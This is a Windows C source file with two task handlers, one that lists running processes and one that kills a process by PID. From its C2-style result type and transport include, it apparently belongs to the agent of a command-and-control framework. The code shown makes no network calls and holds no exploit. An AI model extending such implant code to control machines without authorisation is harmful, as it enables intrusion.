#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"

BOOL task_ps(PC2_RESULT result) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        lstrcpynA(result->error, "CreateToolhelp32Snapshot failed", sizeof(result->error));
        return FALSE;
    }

    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);
    output_printf(out, "%-8s %-8s %-6s %s\r\n", "PID", "PPID", "THDS", "NAME");
    output_printf(out, "%-8s %-8s %-6s %s\r\n", "---", "----", "----", "----");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            output_printf(out, "%-8lu %-8lu %-6lu %s\r\n",
                pe.th32ProcessID,
                pe.th32ParentProcessID,
                pe.cntThreads,
                pe.szExeFile);
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);

    result->data = out->data;
    result->data_size = out->size;
    out->data = NULL;
    HeapFree(GetProcessHeap(), 0, out);
    return TRUE;
}

BOOL task_kill_process(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 4) {
        lstrcpynA(result->error, "no PID specified", sizeof(result->error));
        return FALSE;
    }

    DWORD pid = *(DWORD *)data;
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        lstrcpynA(result->error, "cannot open process", sizeof(result->error));
        return FALSE;
    }

    if (!TerminateProcess(hProcess, 1)) {
        CloseHandle(hProcess);
        lstrcpynA(result->error, "TerminateProcess failed", sizeof(result->error));
        return FALSE;
    }

    CloseHandle(hProcess);
    return TRUE;
}
